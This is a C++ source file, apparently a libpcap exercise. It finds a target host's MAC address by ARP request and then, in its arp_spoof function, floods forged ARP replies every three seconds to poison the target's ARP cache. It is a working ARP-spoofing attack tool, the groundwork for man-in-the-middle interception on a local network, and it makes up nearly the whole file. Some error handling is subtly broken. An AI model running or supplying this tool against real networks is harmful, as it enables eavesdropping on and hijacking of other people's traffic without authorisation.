#include <cstring>
#include <iostream>
#include <net/if.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <stdexcept>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "network/ArpPacket.h"
#include "network/utils.h"

using namespace std;
using namespace network;

pcap *open_dev(const char *dev) {
    pcap *desc;
    char errbuf[PCAP_ERRBUF_SIZE] = {0,};
    if ((desc = pcap_open_live(dev, 8192, 0, 512, errbuf)) == nullptr) {
        throw runtime_error("error: " + string(errbuf));
    }
    return desc;
}

HwAddr get_dev_mac(const char *dev) {
    ifreq ifr{};
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

    std::strncpy(ifr.ifr_name, dev, IF_NAMESIZE - 1);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) != 0) {
        close(fd);
        return HwAddr();
    }

    byte mac[6];
    memcpy(mac, ifr.ifr_addr.sa_data, HwAddr::size);

    close(fd);
    return HwAddr(mac);
}

IpAddr get_dev_ip(const char *dev) {
    ifreq ifr{};
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in *sin;

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFADDR, &ifr) != 0) {
        printf("can't get IP Address\n");
        close(fd);
        return IpAddr();
    }

    close(fd);

    sin = (struct sockaddr_in *) &ifr.ifr_addr;
    return IpAddr(sin->sin_addr.s_addr);
}

HwAddr get_target_mac(const char *dev, const IpAddr &tip) {
    pcap *desc = open_dev(dev);
    HwAddr smac = get_dev_mac(dev);
    IpAddr sip = get_dev_ip(dev);
    ArpPacket arp(ARPOP_REQUEST,
                  smac, sip,
                  HwAddr(), tip);
    arp.ether.dst = broadcast_mac;
    const byte *packet = (byte *) arp;
    if (pcap_sendpacket(desc, packet, ArpPacket::size) != 0) {
        cerr << "Error sending the packet : " << pcap_geterr(desc) << endl;
        exit(-1);
    }

    auto *filter = new bpf_program;
    if (pcap_compile(desc, filter, "arp", 1, 0) == -1 and pcap_setfilter(desc, filter) == -1) {
        cerr << "error: " << pcap_geterr(desc) << endl;
        exit(-1);
    }

    pcap_pkthdr *header;
    int res = 0;
    while ((res = pcap_next_ex(desc, &header, &packet)) >= 0) {
        if (res == 0) continue;
        arp = ArpPacket(packet);
        if (arp.arp.opcode == ARPOP_REPLY and arp.arp.sender_ip == tip) {
            return arp.arp.sender_mac;
        }
    }
    delete (filter);
    return broadcast_mac;
}

void arp_spoof(const char *dev, const string &sender, const string &target) {
    cout << "open device " << dev << endl;
    pcap *desc = open_dev(dev);

    IpAddr sip = IpAddr(sender);
    IpAddr tip = IpAddr(target);
    HwAddr smac = get_dev_mac(dev);
    HwAddr tmac = get_target_mac(dev, tip);

    ArpPacket arp = ArpPacket(ARPOP_REPLY, smac, sip, tmac, tip);
    byte *packet = (byte *) arp;

    cout << "start arp spoofing..." << endl;
    int i = 0;
    while (true) {
        if (pcap_sendpacket(desc, packet, ArpPacket::size) != 0) {
            cerr << "Error sending the packet : " << pcap_geterr(desc) << endl;
            break;
        }
        cout << "sent packet: " << i++ << endl;
        sleep(3);
    }
    free(packet);
    pcap_close(desc);
}